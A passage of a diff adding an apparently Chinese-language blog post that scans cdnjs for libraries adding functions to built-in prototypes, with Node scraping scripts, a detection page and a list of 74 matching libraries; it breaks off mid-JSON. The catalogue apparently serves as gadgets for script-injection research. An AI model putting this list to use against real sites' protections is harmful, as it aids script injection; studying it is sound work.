+  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> char <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">fetching </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>char<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>
+      <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getLibraries</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>
+      <span class="token keyword">const</span> hits <span class="token operator">=</span> data<span class="token punctuation">.</span>hits
+      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'length:'</span><span class="token punctuation">,</span> hits<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
+
+      <span class="token keyword">const</span> filtered <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> item <span class="token keyword">of</span> hits<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>existLib<span class="token punctuation">[</span>item<span class="token punctuation">.</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          filtered<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span>
+        <span class="token punctuation">&#125;</span>
+        existLib<span class="token punctuation">[</span>item<span class="token punctuation">.</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>
+      <span class="token punctuation">&#125;</span>
+      allItems <span class="token operator">=</span> allItems<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>filtered<span class="token punctuation">)</span>
+      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'filtered length:'</span><span class="token punctuation">,</span> filtered<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
+      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'total length:'</span><span class="token punctuation">,</span> allItems<span class="token punctuation">.</span>length<span class="token punctuation">)</span>
+      <span class="token function">write</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>allItems<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Error!'</span><span class="token punctuation">)</span>
+      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">,</span> err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getLibraries</span><span class="token punctuation">(</span><span class="token parameter">keyword</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> instance<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token constant">SEARCH_API_URL</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+        <span class="token literal-property property">params</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">query=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>keyword<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;page=0&amp;hitsPerPage=1000</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>
+        <span class="token literal-property property">restrictSearchableAttributes</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+          <span class="token string">'name'</span>
+        <span class="token punctuation">]</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+  <span class="token keyword">return</span> response<span class="token punctuation">.</span>data
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>跑完以後，我們就可以拿到一個有所有 cdnjs 套件跟名稱的列表。</p>
+<h3><span id="找出每個-library-的所有-js-檔案">找出每個 library 的所有 JS 檔案</span></h3><p>套件的基本資料是放在 algolia，但是一些細節則是放在 cdnjs 自己的 API。</p>
+<p>而這個 API 的規則也很簡單，網址就是：<code>https://api.cdnjs.com/libraries/$&#123;套件名稱&#125;/$&#123;版本&#125;</code>，所以只要把上一步的列表整理一下拿去打 API，就可以拿到每一個套件有哪些檔案：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> axios <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'axios'</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">function</span> <span class="token function">write</span><span class="token punctuation">(</span><span class="token parameter">content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'./data/libDetail.json'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span><span class="token string">'./data/libDetail.json'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'[]'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">const</span> existMap <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
+<span class="token keyword">let</span> detailItems <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./data/libDetail.json'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> item <span class="token keyword">of</span> detailItems<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  
+  existMap<span class="token punctuation">[</span>item<span class="token punctuation">.</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getDetail</span><span class="token punctuation">(</span><span class="token parameter">libName<span class="token punctuation">,</span> version</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">https://api.cdnjs.com/libraries/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>libName<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>version<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
+  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">axios</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> response<span class="token punctuation">.</span>data
+  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'failed:'</span><span class="token punctuation">,</span> libName<span class="token punctuation">,</span> err<span class="token punctuation">.</span>message<span class="token punctuation">)</span>
+    <span class="token comment">//process.exit(1)</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getLib</span><span class="token punctuation">(</span><span class="token parameter">libraries<span class="token punctuation">,</span> lib</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'fetching:'</span><span class="token punctuation">,</span> lib<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
+  <span class="token keyword">const</span> detail <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">getDetail</span><span class="token punctuation">(</span>lib<span class="token punctuation">.</span>name<span class="token punctuation">,</span> lib<span class="token punctuation">.</span>version<span class="token punctuation">)</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>detail<span class="token punctuation">)</span> <span class="token keyword">return</span>
+  detailItems<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>detail<span class="token punctuation">)</span>
+  <span class="token function">write</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>detailItems<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">progress: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>detailItems<span class="token punctuation">.</span>length<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>libraries<span class="token punctuation">.</span>length<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> libraries <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'./data/libs.json'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> lib <span class="token keyword">of</span> libraries<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>existMap<span class="token punctuation">[</span>lib<span class="token punctuation">.</span>name<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">continue</span>
+    <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
+    <span class="token function">getLib</span><span class="token punctuation">(</span>libraries<span class="token punctuation">,</span> lib<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">getFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3><span id="找出符合條件的套件">找出符合條件的套件</span></h3><p>套件列表有了，每個套件有哪些檔案也有了。接著來到我們的最後一步：找出符合條件的套件。</p>
+<p>在 cdnjs 上的套件有 4000 多個，如果一個一個跑的話，那就必須跑 4000 多遍，但其實符合我們條件的應該是少數，所以我選擇 10 個一組去跑，原因是 10 個套件的檔案應該不至於到真的太多，不用怕載入時間很長。如果這 10 個套件都沒有更動 prototype，那就下一組，如果有的話，就用類似二分搜的方式去找出哪些套件有改動到。</p>
+<p>而偵測的 HTML 大概長這樣：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">function</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token parameter">prototype</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">return</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>prototype<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">var</span> protos <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+      <span class="token literal-property property">array</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">string</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">number</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">object</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token keyword">function</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token comment">&lt;!-- insert script here --></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>...<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+  <span class="token comment">&lt;!-- insert script here --></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">var</span> newProtos <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+      <span class="token literal-property property">array</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">string</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">number</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">object</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token keyword">function</span><span class="token operator">:</span> <span class="token function">getPrototypeFunctions</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+      <span class="token literal-property property">prototypeFunctions</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+      <span class="token literal-property property">functionsReturnWindow</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'array'</span><span class="token punctuation">,</span> <span class="token string">'Array.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">Array</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'string'</span><span class="token punctuation">,</span> <span class="token string">'String.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'number'</span><span class="token punctuation">,</span> <span class="token string">'Number.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">Number</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'object'</span><span class="token punctuation">,</span> <span class="token string">'Object.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+      <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token string">'function'</span><span class="token punctuation">,</span> <span class="token string">'Function.prototype'</span><span class="token punctuation">,</span> <span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>
+      <span class="token keyword">return</span> result
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">function</span> <span class="token function">checkPrototype</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> prototypeName<span class="token punctuation">,</span> prototype</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">const</span> oldFuncs <span class="token operator">=</span> protos<span class="token punctuation">[</span>name<span class="token punctuation">]</span>
+      <span class="token keyword">const</span> newFuncs <span class="token operator">=</span> newProtos<span class="token punctuation">[</span>name<span class="token punctuation">]</span>
+      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> fnName <span class="token keyword">of</span> newFuncs<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>oldFuncs<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>fnName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          <span class="token keyword">const</span> fullName <span class="token operator">=</span> prototypeName <span class="token operator">+</span> <span class="token string">'.'</span> <span class="token operator">+</span> fnName
+          result<span class="token punctuation">.</span>prototypeFunctions<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>fullName<span class="token punctuation">)</span>
+          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>prototype<span class="token punctuation">[</span>fnName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> window<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+              result<span class="token punctuation">.</span>functionsReturnWindow<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>fullName<span class="token punctuation">)</span>
+            <span class="token punctuation">&#125;</span>
+          <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+          <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">&#125;</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我們在套件還沒載入時，先記錄起每個 prototype 上面的屬性，載入套件以後再記錄一次然後跟之前做比對，就可以找出哪些是套件引入後才新增的屬性。然後我們也可以把結果分成兩種，一種是只要有改動到 prototype 就記下來，另外一種則是呼叫以後會回傳 window 的。</p>
+<p>整個測試的程式碼比較長一點，完整版在這邊：<a target="_blank" rel="noopener" href="https://github.com/aszx87410/cdnjs-prototype-pollution/blob/main/scan.js">https://github.com/aszx87410/cdnjs-prototype-pollution/blob/main/scan.js</a></p>
+<p>但流程大概就是：</p>
+<ol>
+<li>每十個套件一組，找出會汙染 prototype 的套件</li>
+<li>找出套件後，再找出到底是哪些檔案會汙染 prototype</li>
+<li>印出結果</li>
+</ol>
+<h2><span id="研究結果">研究結果</span></h2><p>在 4290 個套件中，有 74 個（1.72%）套件會在 prototype 上面新增屬性，清單如下：</p>
+<ol>
+<li><code>6to5@3.6.5</code></li>
+<li><code>Colors.js@1.2.4</code></li>
+<li><code>Embetty@3.0.8</code></li>
+<li><code>NicEdit@0.93</code></li>
+<li><code>RGraph@606</code></li>
+<li><code>ScrollTrigger@1.0.5</code></li>
+<li><code>TableExport@5.2.0</code></li>
+<li><code>ajv-async@1.0.1</code></li>
+<li><code>angular-vertxbus@6.4.1</code></li>
+<li><code>asciidoctor.js@1.5.9</code></li>
+<li><code>aurelia-script@1.5.2</code></li>
+<li><code>blendui@0.0.4</code></li>
+<li><code>blissfuljs@1.0.6</code></li>
+<li><code>bootstrap-calendar@0.2.5</code></li>
+<li><code>carto.js@4.2.2</code></li>
+<li><code>cignium-hypermedia-client@1.35.0</code></li>
+<li><code>core-js@3.24.1</code></li>
+<li><code>custombox@4.0.3</code></li>
+<li><code>d3fc@11.0.0</code></li>
+<li><code>d3plus@2.0.1</code></li>
+<li><code>datejs@1.0</code></li>
+<li><code>deb.js@0.0.2</code></li>
+<li><code>defiant.js@2.2.7</code></li>
+<li><code>eddy@0.7.0</code></li>
+<li><code>ext-core@3.1.0</code></li>
+<li><code>extjs@6.2.0</code></li>
+<li><code>fs-tpp-api@2.4.4</code></li>
+<li><code>highcharts@10.2.0</code></li>
+<li><code>inheritance-js@0.4.12</code></li>
+<li><code>jo@0.4.1</code></li>
+<li><code>jquery-ajaxy@1.6.1</code></li>
+<li><code>jquery-ui-bootstrap@0.5pre</code></li>
+<li><code>js-bson@2.0.8</code></li>
+<li><code>jslite@1.1.12</code></li>
+<li><code>json-forms@1.6.3</code></li>
+<li><code>keras-js@0.3.0</code></li>
+<li><code>kwargsjs@1.0.1</code></li>
+<li><code>leaflet.freedraw@2.0.1</code></li>
+<li><code>lobipanel@1.0.6</code></li>
+<li><code>melonjs@1.0.1</code></li>
+<li><code>metro@4.4.3</code></li>
+<li><code>mo@1.7.3</code></li>
+<li><code>monet@0.9.3</code></li>
+<li><code>mootools@1.6.0</code></li>
+<li><code>oidc-client@1.11.5</code></li>
+<li><code>opal@0.3.43</code></li>
+<li><code>prototype@1.7.3</code></li>
+<li><code>qcobjects@2.3.69</code></li>
+<li><code>qoopido.demand@8.0.2</code></li>
+<li><code>qoopido.js@3.7.4</code></li>
+<li><code>qoopido.nucleus@3.2.15</code></li>
+<li><code>quantumui@1.2.0</code></li>
+<li><code>rantjs@1.0.6</code></li>
+<li><code>rita@2.8.1</code></li>
+<li><code>rivescript@2.2.0</code></li>
+<li><code>scriptaculous@1.9.0</code></li>
+<li><code>should.js@13.2.3</code></li>
+<li><code>simple-gallery-js@1.0.3</code></li>
+<li><code>simplecartjs@3.0.5</code></li>
+<li><code>strapdown-topbar@1.6.4</code></li>
+<li><code>string_score@0.1.22</code></li>
+<li><code>survey-angular@1.9.45</code></li>
+<li><code>survey-jquery@1.9.45</code></li>
+<li><code>survey-knockout@1.9.45</code></li>
+<li><code>survey-react@1.9.45</code></li>
+<li><code>survey-vue@1.9.45</code></li>
+<li><code>tablefilter@2.5.0</code></li>
+<li><code>tmlib.js@0.5.2</code></li>
+<li><code>tui-editor@1.4.10</code></li>
+<li><code>typeis@1.1.2</code></li>
+<li><code>uppy@3.0.0</code></li>
+<li><code>vanta@0.5.22</code></li>
+<li><code>waud.js@1.0.3</code></li>
+<li><code>zui@1.10.0</code></li>
+</ol>
+<p>而這 74 個中，有 12 個（16.2%）符合我們的條件，直接呼叫會回傳 <code>this</code>，清單如下：</p>
+<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">[</span>
+  <span class="token punctuation">&#123;</span>
+    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"https://cdnjs.cloudflare.com/ajax/libs/asciidoctor.js/1.5.9/asciidoctor.min.js"</span><span class="token punctuation">,</span>
+    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
+      <span class="token string">"Array.prototype.$concat"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$push"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$append"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$rotate!"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$shuffle!"</span><span class="token punctuation">,</span>
+      <span class="token string">"Array.prototype.$sort"</span><span class="token punctuation">,</span>
